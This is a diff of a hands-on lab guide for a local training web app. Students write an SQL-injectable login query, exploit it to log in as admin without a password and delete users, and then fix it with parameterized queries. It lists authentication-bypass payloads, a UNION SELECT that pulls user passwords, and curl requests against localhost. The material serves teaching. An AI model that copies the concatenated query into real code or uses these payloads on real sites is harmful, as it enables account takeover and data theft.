@@ -38,9 +38,13 @@ The app will start on `http://localhost:3000`. Open this in your browser.
 
 ---
 
-## Step 1: Understanding the Vulnerable Code
+## Step 1: Write the Vulnerable Code
 
-The vulnerable code is in `server.js` at the `/login` POST route. Here's what it looks like:
+In this step, you will **write the vulnerable login code yourself** to understand how SQL injection happens.
+
+### Your Task:
+
+Open `server.js` in your editor and find the login POST route (around line 100). You'll see this skeleton:
 
 ```javascript
 // Login POST - VULNERABLE TO SQL INJECTION
@@ -48,8 +52,8 @@ app.post('/login', (req, res) => {
   const username = req.body.username || '';
   const password = req.body.password || '';
 
-  // VULNERABLE: Direct string concatenation (SQL Injection)
-  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
+  // TODO: Write a vulnerable query that concatenates username and password directly
+  // const query = ???
 
   db.get(query, (err, row) => {
     if (err) {
@@ -57,7 +61,6 @@ app.post('/login', (req, res) => {
     }
 
     if (row) {
-      // User authenticated - create session
       req.session.userId = row.id;
       req.session.username = row.username;
       req.session.isAdmin = row.is_admin;
@@ -69,239 +72,261 @@ app.post('/login', (req, res) => {
 });
 ```
 
-### Why is this vulnerable?
+### Write Your Vulnerable Query:
 
-The code directly inserts the username and password values into the SQL query **without any validation or escaping**:
+Replace the `TODO` line with this vulnerable query:
 
 ```javascript
 const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
 ```
 
-If a user enters special characters or SQL code in the username/password field, it becomes part of the actual SQL command. The database will execute whatever SQL the attacker crafts.
+**Why is this vulnerable?**
+- The query directly inserts `username` and `password` into the SQL using template literals
+- No validation or escaping happens
+- An attacker can inject SQL code by crafting special input
 
-### Your Task for Step 1:
+### After Writing:
 
-1. Open `server.js` and find the vulnerable login code above (around line 76-83).
-2. Read through it carefully.
-3. **Open the app at `http://localhost:3000/login`**
-4. Try a normal login first with credentials: `admin` / `admin123` (should work)
-5. Now try an injection payload (we'll show you how in Step 2)
+1. Save `server.js`
+2. Restart the app: `npm start`
+3. Open `http://localhost:3000/login`
+4. Try a normal login with: admin / admin123 (should work)
+5. Move to **Step 2** to learn how to exploit it
 
 ---
 
-## Step 2: How SQL Queries Work & Exploiting
+## Step 2: How SQL Queries Work & How to Exploit Your Code
 
-Let's understand what the legitimate SQL query looks like:
+Now that you've written the vulnerable query, let's understand **exactly** what happens when an attacker uses SQL injection against your code.
 
-**Normal Login (valid credentials):**
+### Normal Login (No Injection)
+
+When a user logs in normally with:
 - Username: `admin`
 - Password: `admin123`
 
-The generated query becomes:
+Your code builds this SQL query:
+
 ```sql
 SELECT * FROM users WHERE username = 'admin' AND password = 'admin123'
 ```
 
-This returns the admin user ✅
+This query:
+1. Looks for a user with username = 'admin' AND password = 'admin123'
+2. If found, user is authenticated ✅
 
-**Now let's inject malicious SQL:**
+### SQL Injection Attack #1: Comment Bypass
 
-### Payload 1: Comment-based bypass
-- **Username:** `admin' --`
-- **Password:** `anything`
+An attacker enters:
+- Username: `admin' --`
+- Password: `anything` (ignored)
 
-Generated query:
+Your vulnerable code builds:
+
 ```sql
 SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
 ```
 
-The `--` **comments out everything after it**, so the password check is ignored! ✅
+**What happens:**
+- The `--` comments out everything after it
+- The password check is **ignored** 
+- Any user with username 'admin' is authenticated (regardless of password)
+- **Attack succeeds!** ✅
 
-### Payload 2: OR-based bypass
-- **Username:** `' OR '1'='1`
-- **Password:** `' OR '1'='1`
+### SQL Injection Attack #2: OR Logic
 
-Generated query:
+An attacker enters:
+- Username: `' OR '1'='1`
+- Password: `' OR '1'='1`
+
+Your vulnerable code builds:
+
 ```sql
 SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
 ```
 
-Since `'1'='1'` is **always true**, the WHERE clause matches ANY user (usually returns the first one). ✅
+**What happens:**
+- `'1'='1'` is always **true**
+- The WHERE clause matches ANY user
+- Database returns the first user (usually admin)
+- **Attack succeeds!** ✅
 
-### Payload 3: UNION-based attack (advanced)
-- **Username:** `admin' UNION SELECT * FROM users --`
-- **Password:** `anything`
+### Try These Attacks Yourself
 
-This **combines results** from multiple SELECT statements.
+Open `http://localhost:3000/login` and try these payloads:
+
+| Username | Password | What Happens |
+|----------|----------|--------------|
+| `admin' --` | `x` | Logs in as admin (password ignored) |
+| `' OR '1'='1` | `anything` | Logs in as first user in DB |
+| `alice' --` | `x` | Logs in as alice |
+| `admin' OR '1'='1` | `x` | Logs in as admin |
+
+After each successful injection login, you'll be redirected to `/dashboard` and see your username at the top.
 
 ---
 
-## Step 3: Constructing SQL Injection Queries
+## Step 3: Understanding the Attack Mechanics
 
-### Template for Building Payloads:
+### Template for Building Custom Payloads:
 
-**Original Query:**
+Your vulnerable query looks like this:
 ```sql
 SELECT * FROM users WHERE username = 'INPUT1' AND password = 'INPUT2'
 ```
 
-**Attack Strategies:**
+### You Can Try These Strategies:
 
-#### Strategy 1: Comment Everything Out
+**Strategy 1: Comment Out Password Check**
 ```
 username: ' --
-password: anything
-Result: SELECT * FROM users WHERE username = '' -- AND password = 'anything'
+password: (anything)
+Result: SELECT * FROM users WHERE username = '' -- AND password = '(anything)'
+Effect: Password check is ignored!
 ```
 
-#### Strategy 2: OR Logic
+**Strategy 2: OR Logic to Make True Condition**
 ```
 username: ' OR '1'='1
-password: ' OR '1'='1
-Result: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
+password: (anything)
+Result: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '(anything)'
+Effect: Returns first user (usually admin)
 ```
 
-#### Strategy 3: Always True Condition
+**Strategy 3: Combine Strategies**
 ```
-username: admin' OR 'x'='x
-password: anything
-Result: SELECT * FROM users WHERE username = 'admin' OR 'x'='x' AND password = 'anything'
-```
-
-#### Strategy 4: Break the Logic
-```
-username: ' OR 1=1 --
-password: anything
-Result: SELECT * FROM users WHERE username = '' OR 1=1 -- AND password = 'anything'
+username: admin' OR '1'='1 --
+password: (anything)
+Result: SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- AND password = '(anything)'
+Effect: Logs in as admin
 ```
 
 ---
 
-## Step 4: Exploiting on the Website
+## Step 4: Getting Admin Access via Injection
 
-### Using the Web Browser:
+You can now use SQL injection to gain admin access **without knowing the password**!
+
+### Easy Admin Bypass:
 
 1. Open `http://localhost:3000/login`
-2. Try these payloads in the **Username** field:
-
-| Payload | Password | Expected Result |
-|---------|----------|-----------------|
-| `admin' --` | `anything` | Login as admin ✅ |
-| `' OR '1'='1` | `anything` | Login (first user) ✅ |
-| `admin' OR '1'='1` | `test` | Login as admin ✅ |
-| `user1' --` | `x` | Login as user1 ✅ |
-
-### Using curl (Command Line):
-
-```bash
-# Comment bypass
-curl -d "username=admin' --&password=test" http://localhost:3000/login -v
-
-# OR bypass
-curl -d "username=' OR '1'='1&password=' OR '1'='1" http://localhost:3000/login -v
-
-# Check response for redirect to /dashboard (indicates successful login)
-```
-
-### Using Browser DevTools:
-
-1. Open Developer Tools (F12)
-2. Go to **Network** tab
-3. Fill the login form with a payload
+2. Enter: `admin' --` in the username field
+3. Enter anything in the password field (e.g., `x`)
 4. Click Login
-5. Watch the POST request in the Network tab
-6. You should see a **302 redirect** to `/dashboard` (means successful login!)
+
+You're now logged in as **admin**! ✅
+
+### Verify Admin Access:
+
+1. You should be redirected to the dashboard
+2. Click your avatar/profile (top right) → "Admin Panel"
+3. You can now see all users and delete them
+4. Try deleting alice, bob, and carol
+
+### What You Just Did:
+
+You exploited the vulnerable query you wrote. The injection payload bypassed the password check by commenting it out with `--`.
 
 ---
 
-## Step 5: Getting Admin Access
+## Step 5: More Injection Attacks on Search
 
-### Admin Credentials (Hardcoded in server.js):
-- **Username:** `admin`
-- **Password:** `admin123`
+The `/search` endpoint also uses vulnerable code (that you wrote). Try these payloads:
 
-But let's get admin access **without knowing the password**:
+Open `http://localhost:3000/search` and try:
 
-### Method 1: Direct Admin Bypass
-```
-Username: admin' --
-Password: anything
-```
-Click Login → You're logged in as **admin** ✅
-
-### Verify You're Admin:
-1. After logging in, click "Profile"
-2. You should see a **⭐ Administrator** badge
-3. You should see a link to the **Admin Panel**
-
-### Access Admin Panel:
-1. Click "Admin Panel" link (only visible to admins)
-2. You can see all users in the system
-3. You can delete user accounts
-4. You're now an authenticated administrator! 🎯
-
-### What an Admin Can Do:
-- View all user accounts
-- Delete users
-- Access sensitive user data (emails, names, etc.)
+| Query | Effect |
+|-------|--------|
+| `' OR '1'='1` | Returns all products |
+| `Headphones' --` | Searches for Headphones, ignores rest |
+| `' UNION SELECT id, username, password, email, category FROM users --` | Attempts UNION-based extraction (if columns match) |
 
 ---
 
 ## Step 6: Fixing the Code (Remediation)
 
-### The Vulnerable Code (WRONG ❌):
+Now that you understand how your vulnerable code can be exploited, let's fix it!
+
+### The Vulnerable Code You Wrote:
+
 ```javascript
-// VULNERABLE: Direct string concatenation
+// VULNERABLE - what you wrote in Step 1
 const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
 db.get(query, (err, row) => { ... });
 ```
 
-### The Secure Code (RIGHT ✅):
+### The Secure Code You Should Write Now:
+
+Replace your vulnerable query with **parameterized queries** (also called prepared statements):
+
 ```javascript
-// SECURE: Using parameterized queries
+// SECURE - use parameterized queries
 const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
 db.get(query, [username, password], (err, row) => { ... });
 ```
 
-### Why This Works:
+### How Parameterized Queries Work:
 
-With **parameterized queries** (also called **prepared statements**):
-- The SQL structure is defined FIRST
-- User input is inserted AFTER the query structure is parsed
-- The database treats user input as **DATA ONLY**, not as executable code
-- Even if the user enters `admin' --`, it's treated as a literal string value
+1. The SQL structure is defined **FIRST**: `'SELECT * FROM users WHERE username = ? AND password = ?'`
+2. The `?` placeholders are replaced by the database engine, not by string concatenation
+3. User input is treated as **DATA ONLY**, never as executable SQL code
+4. Even if a user enters `admin' --`, it's stored as a literal string value
 
-### Example:
+### Your Task:
+
+1. Open `server.js`
+2. Find the vulnerable query you wrote in the login route
+3. Replace it with the parameterized version above
+4. Do the same for the `/search` endpoint:
+
+```javascript
+// VULNERABLE (what you wrote):
+let query = `SELECT id, name, price, description, category FROM products WHERE (name LIKE '%${q}%' OR description LIKE '%${q}%')`;
+
+// SECURE (what you should write):
+let query = 'SELECT id, name, price, description, category FROM products WHERE (name LIKE ? OR description LIKE ?)';
+db.all(query, [`%${q}%`, `%${q}%`], (err, products) => { ... });
 ```
-Input: admin' --
-Query: SELECT * FROM users WHERE username = ? AND password = ?
-Result: Treated as literal string "admin' --", not as SQL code
-```
 
-### Changes Required in server.js:
-1. **Line 81:** Change the query construction
-2. **Line 83:** Pass parameters as an array to `db.get()`
+### Test Your Fix:
 
-### Lab Completion:
-After making these changes:
-1. Restart the server
-2. Try the SQL injection payloads again
-3. **They won't work anymore** ✅
-4. Only valid credentials will work
-5. Login with: `admin` / `admin123` should work normally
+1. Restart the app: `npm start`
+2. Try the injection payloads again: `admin' --` in the login form
+3. **They won't work anymore!** ✅
+4. Only valid credentials work now: admin / admin123
+5. Try searching with: `' OR '1'='1` - it will search for that literal string instead of returning all products
+
+### Summary of Changes:
+
+| Before (Vulnerable) | After (Secure) |
+|---------------------|----------------|
+| `` `... ${username} ...` `` | `'... ? ...'` with `[username]` |
+| User input is executable SQL | User input is data only |
+| Exploitable by injection | Injection attacks fail |
 
 ---
 
-## Summary
+## Congratulations! 🎓
 
-| Step | Goal | Outcome |
-|------|------|---------|
-| 1 | Understand vulnerable code | Identified direct string concatenation |
-| 2 | Learn how SQL injection works | Discovered comment (`--`) and OR (`'1'='1`) bypasses |
-| 3 | Construct payloads | Built custom SQL injection queries |
-| 4 | Exploit on website | Successfully bypassed authentication |
-| 5 | Gain admin access | Logged in as administrator without password |
-| 6 | Fix vulnerability | Implemented parameterized queries |
+You have:
+1. ✅ Written vulnerable SQL injection code
+2. ✅ Understood how SQL injection attacks work
+3. ✅ Exploited your own code
+4. ✅ Fixed the vulnerability using parameterized queries
+5. ✅ Verified that injection no longer works
+
+---
+
+## Summary of All Steps
+
+| Step | Task | Key Learning |
+|------|------|--------------|
+| 1 | Write vulnerable code | Direct string concatenation is dangerous |
+| 2 | Learn attack mechanics | Comments (`--`) and OR logic (`'1'='1'`) bypass logic |
+| 3 | Build custom payloads | Understand how to construct injection attacks |
+| 4 | Exploit your code | Demonstrate real impact (admin bypass) |
+| 5 | Try more attacks | Search endpoint and UNION-based techniques |
+| 6 | Fix the code | Use parameterized queries for safety |
 
 ---
 
